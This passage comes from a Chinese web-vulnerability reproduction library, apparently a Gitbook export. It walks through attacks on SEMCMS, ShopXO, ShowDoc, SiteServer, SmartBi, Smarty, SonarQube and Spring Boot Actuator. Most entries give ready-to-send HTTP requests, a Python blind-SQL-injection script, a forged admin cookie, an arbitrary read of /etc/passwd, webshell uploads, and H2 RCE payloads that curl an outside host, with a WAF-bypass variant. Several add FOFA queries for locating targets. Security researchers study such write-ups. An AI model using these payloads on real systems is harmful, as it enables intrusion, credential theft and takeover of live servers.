访问后台登录页面如下： 先来看看正常的找回密码的过程。 首先，查看 tfmp_Admin/index.html 的源码： 从代码可以看到，当点击登录按钮旁边的链接\"如果忘记账号与密码，试试找回？\"，时，会执行 js的views() 函数，该函数是弹出一个对话框并向SEMCMS_Remail.php?type=find 发送请求，让用户填写要接收重置后密码的邮箱地址，如下： 可以看到，就是构造上面那个要求输入E-mail的表单，点击\"确认找回\"按钮，该表单会提交到 ../Include/web_email.php?type=findpassword ，再看一下 web_email.php 中 type=findpassword 时的代码： 代码会根据用户输入的E-mail地址，查找 sc_user 表，看是否存在使用该E-mail地址的用户，如果存在，则随机生成4位数的认证码，并将其拼接到一个密码重置链接中，最后以邮件的形式发送给用户。用户点击邮件中的密码重置链接即可；但如果不存在，则弹出对话框，提示\"此邮箱不存在！\"，如图： 这里假设知道了管理员的邮箱，由于认证码是随机的4位数，这里很容易想到暴力破解。但通过 ../Include/web_email.php?type=findpassword 无法进行暴力破解，因为如上面代码所示，每次进入 if ($Type == \\'findpassword\\') 语句块，认证码会重新生成。所以只能看看有没有别的地方可以利用。 回头再查看 index.html 的代码： 当请求参数 type=ok 时，SEMCMS_Remail.php后面跟的参数type也是ok，而前面提到，这种情况下，SEMCMS_Remail.php会构造另外一个表单，如下： 点击\"确认找回\"按钮，会提交到 ../Include/web_email.php?type=findok ，web_email.php 相应部分的代码如下： 可以看到，密码会经过md5加密后再存入数据库中。 因此，这里可以通过 http://0-sec.org/semcms_php_v2.7/tfmp_Admin/index.html?type=ok&umail=41864438@qq.com 弹出的表单，提交表单，使用BurpSuite进行暴力破解从而将密码重置。 为了本地测试方便，所以将初始密码设置为 111111，其md5的值为：96e79218965eb72c92a549dd5a330112。重置后密码将变为123456，MD5加密后即 e10adc3949ba59abbe56e057f20f883e 先用Python生成一个四位数字的字典： 利用BurpSuite 进行暴力破解： 结束后，查看数据库，发现密码确实被重置了： 使用 Admin/123456 可以成功登陆后台管理页面： 另外，这里涉及到表单提交，所以过程中我也想到过能否使用sql注入，然而每一次表单的提交，php代码中都在sql语句构造前，对用户的表单输入通过 test_input() 函数进行了安全检查和过滤，所以不存在SQL注入的问题。 参考链接 https://www.jianshu.com/p/4776cec565c1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:03 "},"Web安全/Semcms/Semcms v3.5 sql注入漏洞/Semcms v3.5 sql注入漏洞.html":{"url":"Web安全/Semcms/Semcms v3.5 sql注入漏洞/Semcms v3.5 sql注入漏洞.html","title":"Semcms v3.5 sql注入漏洞","keywords":"","body":"Semcms v3.5 sql注入漏洞 一、漏洞简介 二、漏洞影响 Semcms v3.5 三、复现过程 漏洞分析 在分析过程中看到网上已经有人发现semcms V2.4存在过滤不严导致sql注入的漏洞，不知道咋还没改，而且最新版过滤的关键字更少了。 首先查看首页文件index.php的代码 1 1 //网站logo 2 3 $weblogo=$web_url_meate.str_replace('../','',$row['web_logo']); 4 5 // 控制文字标签 更改 获取的 语种 id 6 7 if (isset($_GET[\"languageIDD\"])){$Language=test_input(verify_str($_GET[\"languageIDD\"]));}else{$Language=verify_str($Language);} 8 9 if(!empty($Language)){ 10 11 //网站SEO设定 12 13 $query=$db_conn->query(\"select * from sc_tagandseo where languageID=$Language\"); 14 $row=mysqli_fetch_array($query); 15 $tag_indexmetatit=datato($row['tag_indexmetatit']);// 首页标题 1 // 防sql入注 2 3 if (isset($_GET)){$GetArray=$_GET;}else{$GetArray='';} 　　　　//所有GET方式提交的变量都进行防注入检查 4 5 foreach ($GetArray as $value){ //get 6 7 verify_str($value); 8 9 } 10 11 function inject_check_sql($sql_str) { 12 13 return preg_match('/select|insert|=|%|\", \"\", $data); 4 $data = str_replace(\"%\", \"percent\", $data); 5 $data = trim($data); 6 $data = stripslashes($data); 7 $data = htmlspecialchars($data,ENT_QUOTES);　　　　//实体编码 8 return $data; 9 10 } 　　可以看到第16行的函数verify_str()调用inject_check_sql()用来过滤危险字符，函数test_input用来过滤xss。其中可以明显地看到第11行的函数inject_check_sql()采用白名单的方式是有缺陷的，我们可以用布尔盲注来绕过 漏洞复现 http://0-sec.org/SEMCMS_PHP_3.5/index.php?languageIDD=1 and strcmp(left(user(),1), 0x72) rlike 0　　　　显示正常 http://0-sec.org/SEMCMS_PHP_3.5/index.php?languageIDD=1 and strcmp(left(user(),1), 0x73) rlike 0　　　　显示错误 参考网上已有的fuzz盲注脚本改了下，代码如下 #用python3版本 import requests url = \"http://172.19.77.44/SEMCMS_PHP_3.5/index.php?languageIDD=1\" print(\"Testing url: \" + url) #十进制数33-126间的ascii hex值 payload = [\"0x21\",\"0x22\",\"0x23\",\"0x24\",\"0x25\",\"0x26\",\"0x27\",\"0x28\",\"0x29\",\"0x2a\", \"0x2b\",\"0x2c\",\"0x2d\",\"0x2e\",\"0x2f\",\"0x30\",\"0x31\",\"0x32\",\"0x33\",\"0x34\", \"0x35\",\"0x36\",\"0x37\",\"0x38\",\"0x39\",\"0x3a\",\"0x3b\",\"0x3c\",\"0x3d\",\"0x3e\", \"0x3f\",\"0x40\",\"0x41\",\"0x42\",\"0x43\",\"0x44\",\"0x45\",\"0x46\",\"0x47\",\"0x48\", \"0x49\",\"0x4a\",\"0x4b\",\"0x4c\",\"0x4d\",\"0x4e\",\"0x4f\",\"0x50\",\"0x51\",\"0x52\", \"0x53\",\"0x54\",\"0x55\",\"0x56\",\"0x57\",\"0x58\",\"0x59\",\"0x5a\",\"0x5b\",\"0x5c\", \"0x5d\",\"0x5e\",\"0x5f\",\"0x60\",\"0x61\",\"0x62\",\"0x63\",\"0x64\",\"0x65\",\"0x66\", \"0x67\",\"0x68\",\"0x69\",\"0x6a\",\"0x6b\",\"0x6c\",\"0x6d\",\"0x6e\",\"0x6f\",\"0x70\", \"0x71\",\"0x72\",\"0x73\",\"0x74\",\"0x75\",\"0x76\",\"0x77\",\"0x78\",\"0x79\",\"0x7a\", \"0x7b\",\"0x7c\",\"0x7d\" ] user = \"\" for b in range(len(payload)): for a in payload: #sql_payload_user = \" and strcmp(substr(database(),%s,1), 0x%s) rlike 0\" % (b+1, a.replace(\"0x\",\"\")) #当前数据库名称 sql_payload_user = \" and strcmp(substr(user(),%s,1), 0x%s) rlike 0\" % (b+1, a.replace(\"0x\",\"\")) #当前数据库用户名 res = requests.get(url + sql_payload_user).text res1 = requests.get(url).text if len(res) == len(res1): #如果返回的内容长度大小一样，则表示匹配成功 user = user + a print(\" \") print(\"[*]info : 0x\" + user.replace(\"0x\",\"\").upper()) break else: print('\\r',\"Match failed,Next.....\",end='') 测试结果如下图 解码ascii hex值0x726F6F74406C6F63616C686F7374为root\\@localhost。当然因为过滤了select，获取表名就有点困难了，t00ls中看到有人介绍用selselectect来绕过的方式跟这个CMS的过滤方式是不一样的，所以行不通。暂时想到的办法是可以找一与验证密码有关的注点，因为这个注点包含表名，所以可以通过fuzz猜测其字段名，最后通过字段名取得字段值，可以看下这篇文章blind-sql-injection-burpsuite-like-a-boss(要翻墙) 参考链接 https://www.cnblogs.com/st404/p/10087191.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:08 "},"Web安全/Semcms/Semcms v3.8 sql注入漏洞/Semcms v3.8 sql注入漏洞.html":{"url":"Web安全/Semcms/Semcms v3.8 sql注入漏洞/Semcms v3.8 sql注入漏洞.html","title":"Semcms v3.8 sql注入漏洞","keywords":"","body":"Semcms v3.8 sql注入漏洞 一、漏洞简介 二、漏洞影响 Semcms v3.8 三、复现过程 URL: http://0-sec.org/123/sOWj5B_Admin/SEMCMS_Inquiry.php {width=\"5.833333333333333in\" height=\"2.9166666666666665in\"}Debug：Defense module is class.phpmailer.php and function inject_check_sql{width=\"5.833333333333333in\" height=\"0.4946084864391951in\"}But VID[] didn\\'t handle it POST POST /123/sOWj5B_Admin/SEMCMS_Inquiry.php?Class=Deleted&CF=Inquriy&page= HTTP/1.1 Host: 0-sec.org Content-Length: 24 Cache-Control: max-age=0 Origin: http://127.0.0.1 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Referer: http://127.0.0.1/123/sOWj5B_Admin/SEMCMS_Inquiry.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: MEIQIA_EXTRA_TRACK_ID=1F7WZdk3rwHIzKqUfkrNaZ9t1EE; _ga=GA1.1.1842664860.1547715044; UM_distinctid=169c55686280-0636c606d502d3-36664c08-1fa400-169c556862b2e4; CNZZDATA1256162028=1606185978-1553793969-%7C1553793969; CNZZDATA1707573=cnzz_eid%3D987595238-1554794879-http%253A%252F%252F127.0.0.1%252F%26ntime%3D1554913098; PHPSESSID=n75nrqp26757vguhhgd4mlptd4; __51cke__=; __tins__4329483=%7B%22sid%22%3A%201556088941568%2C%20%22vd%22%3A%203%2C%20%22expires%22%3A%201556090843766%7D; __51laig__=3; scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b Connection: close languageID=&AID%5B%5D=3 image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:12 "},"Web安全/ShopXO/ShopXO v1.8.0 后台getshell/ShopXO v1.8.0 后台getshell.html":{"url":"Web安全/ShopXO/ShopXO v1.8.0 后台getshell/ShopXO v1.8.0 后台getshell.html","title":"ShopXO v1.8.0 后台getshell","keywords":"","body":"ShopXO v1.8.0 后台getshell 一、漏洞简介 二、漏洞影响 ShopXO 小于v1.8.0 三、复现过程 默认后台密码admin shopxo 登入后台-》应用中心-》应用商店-》主题 随便下载一个主题 然后把下载下来的压缩包解压出来 把shell放入static目录 回到网站后台网站管理-》主题管理-》安装主题 shell地址 http://www.0-sec.org/static/index/default/shell.php public是运行目录！！！ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:14 "},"Web安全/ShopXO企业级商城/ShopXO企业级商城download 任意文件读取漏洞/ShopXO企业级商城download 任意文件读取漏洞.html":{"url":"Web安全/ShopXO企业级商城/ShopXO企业级商城download 任意文件读取漏洞/ShopXO企业级商城download 任意文件读取漏洞.html","title":"ShopXO企业级商城download 任意文件读取漏洞","keywords":"","body":"ShopXO download 任意文件读取漏洞 漏洞描述 ShopXO是一套开源的企业级开源电子商务系统。ShopXO存在任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息 漏洞影响 ShopXO FOFA app=\"ShopXO企业级B2C电商系统提供商\" 漏洞复现 商城主页如下 发送漏洞请求包 GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q= HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 其中 /url/xxxx 中的 base64 解码后为 /etc/passwd Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:16 "},"Web安全/ShowDoc/ShowDoc任意文件上传漏洞/ShowDoc任意文件上传漏洞.html":{"url":"Web安全/ShowDoc/ShowDoc任意文件上传漏洞/ShowDoc任意文件上传漏洞.html","title":"ShowDoc任意文件上传漏洞","keywords":"","body":"漏洞描述 ShowDoc一个非常适合IT团队的 API文档、技术文档工具,存在任意文件上传漏洞 漏洞影响 showdoc 漏洞复现 FOFA app=\"ShowDoc\" payload POST /index.php?s=/home/page/uploadImg HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Content-Length: 239 Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190633 Accept-Encoding: gzip ----------------------------835846770881083140190633 Content-Disposition: form-data; name=\"editormd-image-file\"; filename=\"test.<>php\" Content-Type: text/plain ----------------------------835846770881083140190633-- Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:18 "},"Web安全/SiteServer/SiteServer CMS 5.0 管理后台Cookie欺骗/SiteServer CMS 5.0 管理后台Cookie欺骗.html":{"url":"Web安全/SiteServer/SiteServer CMS 5.0 管理后台Cookie欺骗/SiteServer CMS 5.0 管理后台Cookie欺骗.html","title":"SiteServer CMS 5.0 管理后台Cookie欺骗","keywords":"","body":"SiteServer CMS 5.0 管理后台Cookie欺骗 一、漏洞简介 SiteServer CMS 5.0 后台访问控制采用JWT技术进行身份鉴别，HTTP请求时通过Cookie中的ss_administrator_access_token字段值作为身份鉴别，而加密ss_administrator_access_token字段值的key在安装时未进行随机初始化，导致所有相同版本的应用系统Cookie可以通用,通过修改Cookie可登陆任意相同版本后台。 二、漏洞影响 SiteServer CMS 5.0 三、复现过程 系统环境：IIS 7.5 + MSSQL 2008 R2 （操作系统：Windows Server 2008 R2） 先访问一个站点，以官方体验站点为例子： http://cms.demo.siteserver.cn/siteserver/login.aspx Chrome浏览器按F12切换到控制台，设置ss_administrator_access_token的Cookie值（以下PoC可以直接使用）： document.cookie='ss_administrator_access_token=M3ENIa3NKJJ39JCRHnY4PgfJqMC7lFjggL0e9S06Bs9ubZE90add0xM2aesaL0add0Cxo8Xe5VZrSanerzFU8oZaMXCC9AoJfZvq5AtBXGxi0slash0tCRtk8UgV5UXu1u2pDL6htbwIqGBZx0slash0ZqVH4x0LjRE20slash0mz3FHc5QJFpTAKI0slash0AJ52LJ6XnWB7gsJuHFauL0add0q0add0sIMft8e3ef840gWzQaChpfGHfYwGS5wHFaC19T56X2J0Z5Hn500equals0' 再次访问（后面没有login.aspx）： http://cms.demo.siteserver.cn/siteserver/ 登陆成功 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:19 "},"Web安全/smart-web2/smart-web2简单OA系统未授权漏洞/smart-web2简单OA系统未授权漏洞.html":{"url":"Web安全/smart-web2/smart-web2简单OA系统未授权漏洞/smart-web2简单OA系统未授权漏洞.html","title":"smart-web2简单OA系统未授权漏洞","keywords":"","body":"smart-web2简单OA系统未授权漏洞 漏洞描述 smart-web2是一套相对简单的OA系统；包含了流程设计器，表单设计器，权限管理，简单报表管理等功能，经过代码审计发现其存在未授权漏洞。 漏洞影响 smart-web2 漏洞分析 1、漏洞代码位置 cn.com.smart.web.interceptor.ACLInterceptor 这是一个拦截器，在第164行对用户的uri进行了判断，如果isExclude返回为True，则会走到else，走到else则不需用户进行身份认证。 接下来我们追踪isExclude代码： excludeMaps来源于： smart-web2.src.main.resources.spring-web-config.xml 继续追踪，内容为： 我们可以确定如果uri开头为excludeMaps中的内容则不需要认证，例如 http://x.x.x.x:8080/sso/../user/list Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:20 "},"Web安全/SmartBi/SmartBi全版本 SQl注入 任意文件上传漏洞/SmartBi全版本 SQl注入 任意文件上传漏洞.html":{"url":"Web安全/SmartBi/SmartBi全版本 SQl注入 任意文件上传漏洞/SmartBi全版本 SQl注入 任意文件上传漏洞.html","title":"SmartBi全版本 SQl注入 任意文件上传漏洞","keywords":"","body":"SmartBi全版本 SQl注入 任意文件上传漏洞 前言 Smarbi是由思迈特软件开发的一款企业级商业智能和大数据分析平台，满足用户在企业级报表、数据可视化分析、自助分析平台、数据挖掘建模、AI智能分析等大数据分析需求。致力于打造产品销售、产品整合、产品应用的生态系统，与上下游厂商、专业实施伙伴和销售渠道伙伴共同为最终用户服务，通过Smartbi应用商店（BI+行业应用）为客户提供场景化、行业化数据分析应用。通过官网可知国内大部分银行，央企，部委都部署有该系统。在一次安全评估项目中遇到该平台，在网上找到相关源码后遂对该平台进行分析审计，挖掘出了一些问题。 SQL注入 本来是想找个RCE的漏洞。但发现存在SQL注入。打开web.xml文件。发现一个FileResource类。感觉像是一个文件的读写类。我们追踪到class，然后看下类实现方法，通过浏览代码语法我们可以了解到该系统使用Servlet实现http的交互。这里简单的阐述一下Servlet的概念，方便后续理解。 大家都知道Servlet，但是不一定很清楚servlet框架，这个框架是由两个Java包组成:javax.servlet和javax.servlet.http，在javax.servlet包中定义了所有的Servlet类都必须实现或扩展的的通用接口和类，在javax.servlet.http包中定义了采用HTTP通信协议的HttpServlet类，Servlet的框架的核心是javax.servlet.Servlet接口,所有的Servlet都必须实现这一接口，在Servlet接口中定义了5个方法,如图琐事哦，其中前3个方法代表了Servlet的声明周期: 当Web容器接收到某个Servlet请求时,Servlet把请求封装成一个HttpServletRequest对象,然后把对象传给Servlet的对应的服务方法。HTTP的请求方式包括DELETE,GET,OPTIONS,POST,PUT和TRACE,在HttpServlet类中分别提供了相应的服务方法,它们是,doDelete(),doGet(),doOptions(),doPost(), doPut()和doTrace().。当我们了解了这些前置知识后。大大的方便了我们理解接下来的代码。 根据我们前面所了解到的一些前置知识。我们来看doGet方法的实现。 前面一堆巴拉巴拉我们先不讲。我们直接来看353-363行。resID通过getParameter获取。我们可控，然后直接在363行就将变量拼接到SQL语句里去了。而且直接就executeQuery了，前面都用了prepareStatement来预防SQL注入。为啥这里就直接拼接SQL语句了呢。我严重怀疑这是临时工写的代码。很明显这里存在SQL注入了。 我们直接构造payload注入即可： http://www.xxx.com//vision/FileResource?op=OPEN&resId=LOGIN_BG_IMG 由于数据库存在差异。大家直接丢sqlmap跑就行了 任意文件上传 挖注入不是我的本来目的，任何以渗透测试为目的的代码审计最终的目标都是RCE或者任意文件上传。于是我继续寻找涉及文件操作的相关代码。PS:此处踩了很多坑。通过寻找web.xml里的配置信息。我快速定位到了一处上传接口UploadImageServlet。跟进看看 如果type不为download和view则进入uploadImage。跟进 看uploadImage前面的代码看的我很开心，仿佛好像没有过滤后缀之类的。仿佛任意文件上传就在眼前，代码的执行逻辑我写在注释里了。看到base64的操作我很疑惑。正常不应该直接写文件了么。直到我看到saveImageContent时，我的心一凉。根据函数名不难理解为保存图片内容。跟进看看。是否为我猜想的直接把文件内容入库了。 跟进saveImageContent，看到PageDAO后心彻底凉了。这里可以确定文件入库了，并没有落地到目录。就算没有过滤后缀。也没办法利用。 于是乎我就继续找呀找呀。发现这套系统百分之99的文件上传都是写到数据库里，着实恶心到我了。这时候我转战寻找jsp文件。我寻思独立写的jsp文件应该没有这么严谨。山重水复疑无路，柳暗花明又一村。经过耐心的寻找。终于定位到一个 上传文件。 /vision/designer/imageimport.jsp 纵观代码逻辑。先定义写入目录。然后判断目录是否存在，如果不存在则创建目录。然后读取header里的两个参数，用来作为文件名和文件类型，随后简单的判断一下type是否为image。然后就直接fos.write了。文件落地到/vision/designer/images/。一个比后门还要后门的文件上传写法。要不是我看到同目录其他的一些文件我差点以为这是一个后门了。构造上传也就很简单了。在header里面添加两个参数。X-File-Name为文件名。POST正文为你要上传的文件内容。请求即可 Payload: POST /vision/designer/imageimport.jsp HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: UserLogging=false; FQConfigLogined=; FQPassword=; JSESSIONID=AAEDEBC8984E4F540DFAAF8C0F932035 X-File-Type: image X-File-Name: 1.jsp Connection: close Upgrade-Insecure-Requests: 1 Content-Type: multipart/form-data; boundary=---------------------------2927288396864 Content-Length: 374 test 结语 通过对smartBI的代码进行分析。不难看出开发设计人员还是很具备安全意识的，文件上传操作几乎都是直接入库了。大部分请求也通过RMIServlet进行处理。且接口请求数据和返回数据都加密处理了。但是百密终有一疏，出现拼接SQL注入这种写法着实不应该。这篇文章有很多不足，写的也很浅显。只做抛砖引玉。欢迎各位师傅多多指正。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:23 "},"Web安全/Smarty/（CVE-2017-1000480）Smarty=3.1.31 命令执行RCE/（CVE-2017-1000480）Smarty=3.1.31 命令执行RCE.html":{"url":"Web安全/Smarty/（CVE-2017-1000480）Smarty=3.1.31 命令执行RCE/（CVE-2017-1000480）Smarty=3.1.31 命令执行RCE.html","title":"（CVE-2017-1000480）Smarty=3.1.31 命令执行RCE","keywords":"","body":"（CVE-2017-1000480）Smarty\\ 一、漏洞简介 在不清理模板名称的自定义资源上调用fetch（）或display（）函数时，3.1.32之前的Smarty 3容易受到PHP代码注入的攻击。 二、漏洞影响 Smarty\\ 三、复现过程 1、搭建环境 测试环境为： PHP5.6.40+Apache2+Smarty3.1.31+Debian9 ➜ html mkdir smarty ➜ html cd smarty ➜ smarty mkdir cache compile templates ➜ smarty composer require smarty/smarty -v ➜ smarty sed -i -e 's/\\^3.1/3.1.31/g' composer.json ➜ smarty composer update ➜ smarty sudo chmod -R 777 . /var/www/html/smarty/index.php 如下： setCacheDir('cache'); $smarty->setCompileDir('compile'); $smarty->setTemplateDir('templates'); $my_security_policy = new Smarty_Security($smarty); $smarty->enableSecurity($my_security_policy); $smarty->registerResource('username', new Smarty_Resource_Widget()); $smarty->display('username:'.$_GET['mochazz']); ?> 2、漏洞分析 具体攻击 payload 如下： http://0-sec.org/index.php?mochazz=*/phpinfo();/* Smarty 我们直接从 display 方法开始跟进，会发现其最终会调用 render 方法。在 render 方法分别进行了：生成compile文件名、写入compile文件并包含两个操作。 Smarty 在第一个操作：生成compile文件名时，我们传入 display 的参数会影响最终的 compile 文件名。例如下面两个 payload 生成的文件名是不一样的。 # 代码：$smarty->display('username:'.$_GET['mochazz']); # payload1：http://0.0.0.0/smarty/index.php?mochazz=*/phpinfo();/* 4f97532c32c10229713a39421c918cf16663bf6e_0.username.*.php # payload2：http://0.0.0.0/smarty/index.php?mochazz=*/phpinfo();// 1e95a2d156a7edd4f6130643849a588dce4acb27_0.username.phpinfo();.php 这是因为 compile 文件名中，有一部分由 basename($source->name) 决定，这部分就是我们传入的 mochazz 参数。使用上面第一个 payload 时，文件名就会包含 号。在 Linux 系统下，文件名允许包含 号，但是 Windows 却不允许，这也是网络上部分文章说这个漏洞无法在 Windows 平台下利用。但是我们使用第二个 payload ，两个平台就都可以利用。 我们接着看第二个操作：写入 compile 文件并包含。首先，写入 compile 文件中的内容包含模板路径（即下图最后一行代码 $_template->source->filepath ），这个模板路径就是我们传入 display 方法的参数。虽然该参数被注释包裹，但是我们可以用 */ 闭合。写入 compile 文件，程序就开始包含该文件，最终导致代码执行（下图第137行）。 image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:26 "},"Web安全/SonarQube/SonarQube api 信息泄露漏洞 CVE-2020-27986/SonarQube api 信息泄露漏洞 CVE-2020-27986.html":{"url":"Web安全/SonarQube/SonarQube api 信息泄露漏洞 CVE-2020-27986/SonarQube api 信息泄露漏洞 CVE-2020-27986.html","title":"SonarQube api 信息泄露漏洞 CVE-2020-27986","keywords":"","body":"SonarQube api 信息泄露漏洞 CVE-2020-27986 漏洞描述 SonarQube 某接口存在信息泄露漏洞，可以获取部分敏感信息 漏洞影响 [!NOTE] SonarQube FOFA [!NOTE] app=\"sonarQube-代码管理\" 漏洞复现 主页如下 漏洞POC http://xxx.xxx.xxx.xxx/api/settings/values 可泄露的为：明文SMTP、SVN和Gitlab等敏感信息 Goby & POC [!NOTE] SonarQube api Information leakage Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:28 "},"Web安全/Spring Boot/Spring Boot Actuator H2 RCE/Spring Boot Actuator H2 RCE.html":{"url":"Web安全/Spring Boot/Spring Boot Actuator H2 RCE/Spring Boot Actuator H2 RCE.html","title":"Spring Boot Actuator H 2 RCE","keywords":"","body":"Spring Boot Actuator H2 RCE 漏洞描述 Actuator 是 Spring Boot 提供的服务监控和管理中间件。当 Spring Boot 应用程序运行时，它会自动将多个端点注册到路由进程中。而由于对这些端点的错误配置，就有可能导致一些系统信息泄露、XXE、甚至是 RCE 等安全问题。Actuator 是 Spring Boot 提供的服务监控和管理中间件。当 Spring Boot 应用程序运行时，它会自动将多个端点注册到路由进程中。而由于对这些端点的错误配置，就有可能导致一些系统信息泄露、XXE、甚至是 RCE 等安全问题。 漏洞影响 Spring Boot Spring Boot >= 1.5 // 默认只允许访问/health和/info端点，但是此安全性通常被应用程序开发人员禁用 FOFA body=\"Whitelabel Error Page\" 源码分析 复现前先说一下如何判断目标站点是否使用Spring Boot框架。Spring Boot框架通常有两个特征点： 网站ico文件是一片绿叶并且特有的报错信息为“Whitelabel Error Page” 漏洞环境搭建 git clone https://github.com/spaceraccoon/spring-boot-actuator-h2-rce.git 使用docker启动环境 先cd进入spring-boot-actuator-h2-rce目录然后执行以下命令 docker build -t spaceraccoon/spring-boot-rce-lab docker run -p 8080:8080 -t spaceraccoon/spring-boot-rce-lab 访问:http://x.x.x.x:port/actuator，如下存在端点信息 存在端点信息，接着发送如下POST包配置spring.datasource.hikari.connection-test-query的值。 POST /actuator/env HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Type: application/json Content-Length: 389 {\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}'; CALL EXEC('curl x.x.x.x:port');\"} 注：CALL EXEC(‘要执行的命令’) 查看/actuator/env信息，配置成功 NC监听，向端点 /actuator/restart 发送POST请求, 重启应用。 POST /actuator/restart HTTP/1.1 Host: 39.105.93.185:8080 Content-Type: application/json Content-Length: 356 {} 访问 http://x.x.x.x:port/actuator/restart如下即启动成功 NC成功返回。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:32 "},"Web安全/Spring Boot/Spring Boot Actuator hikari配置不当导致的远程命令执行漏洞/Spring Boot Actuator hikari配置不当导致的远程命令执行漏洞.html":{"url":"Web安全/Spring Boot/Spring Boot Actuator hikari配置不当导致的远程命令执行漏洞/Spring Boot Actuator hikari配置不当导致的远程命令执行漏洞.html","title":"Spring Boot Actuator hikari配置不当导致的远程命令执行漏洞","keywords":"","body":"Spring Boot Actuator hikari配置不当导致的远程命令执行漏洞 一、漏洞简介 Spring Boot 2.x默认使用的HikariCP数据库连接池提供了一个可以RCE的变量。这个变量就是spring.datasource.hikari.connection-test-query。这个变量与HikariCP中的connectionTestQuery配置相匹配。根据文档，此配置定义的是在从池中给出一个连接之前被执行的query，它的作用是验证数据库连接是否处于活动状态。简言之，无论何时一个恶心的数据库连接被建立时，spring.datasource.hikari.connection-test-query的值将会被作为一个SQL语句执行。然后利用SQL语句中的用户自定义函数，进行RCE。 二、漏洞影响 Spring Boot 2.x 三、复现过程 漏洞环境 https://github.com/ianxtianxt/springboot\\_actuator H2 CREATE ALIAS 命令 H2数据库引擎是一个流行的java开发数据库，非常容易与Spring Boot集成，仅仅需要如下的一个dependency。 com.h2database h2 runtime 在H2中有一个非常重要的命令，与PostgreSQL中的用户定义函数相似，可以用CREATE ALIAS创建一个java函数然后调用它，示例如下: CREATE ALIAS GET_SYSTEM_PROPERTY FOR \"java.lang.System.getProperty\"; CALL GET_SYSTEM_PROPERTY('java.class.path'); 仿照这个，创建命令执行的java函数可以如下: String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) { return s.next(); } throw new IllegalArgumentException(); } 那么RCE所需的SQL语句即: CREATE ALIAS EXEC AS \"String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}\"; CALL EXEC('/Applications/Calculator.app/Contents/MacOS/Calculator'); 与1.x类似，在端点/actuator/env通过POST方法进行环境变量的赋值。payload为 POST /actuator/env HTTP/1.1 content-type: application/json {\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}'; CALL EXEC('/Applications/Calculator.app/Contents/MacOS/Calculator');\"} 执行RCE的SQL语句已经构建好，接下来就是触发一个新的数据库连接，通过向端点/actuator/restart发送POST请求，即可重启应用出发新的数据库连接。请求如下 POST /actuator/restart HTTP/1.1 content-type: application/json {} 命令执行的结果: 针对WAFs 在这点上，可能会遇到常见的WAF过滤器，特别是对exec的过滤。然而，像这样的一个payload可以很容易地使用多种字符串拼接技术来绕过。比如使用CONCAT或HEXTORAW命令。上面的payload可写成 CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }'); CALL EXEC('curl http://x.burpcollaborator.net'); 有限的执行上下文的命令注入 spring.datasource.hikari.connection-test-query是用来验证连接到数据库的连接是否存活。如果语句失败，应用会相信数据库无法连接并不再返回其他的数据库查询。攻击者可利用此来获得一个blind RCE。 参考链接 https://xz.aliyun.com/t/7480\\#toc-3 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:45 "},"Web安全/Spring Boot/Spring Boot Actuator jolokia 配置不当导致的rce漏洞/Spring Boot Actuator jolokia 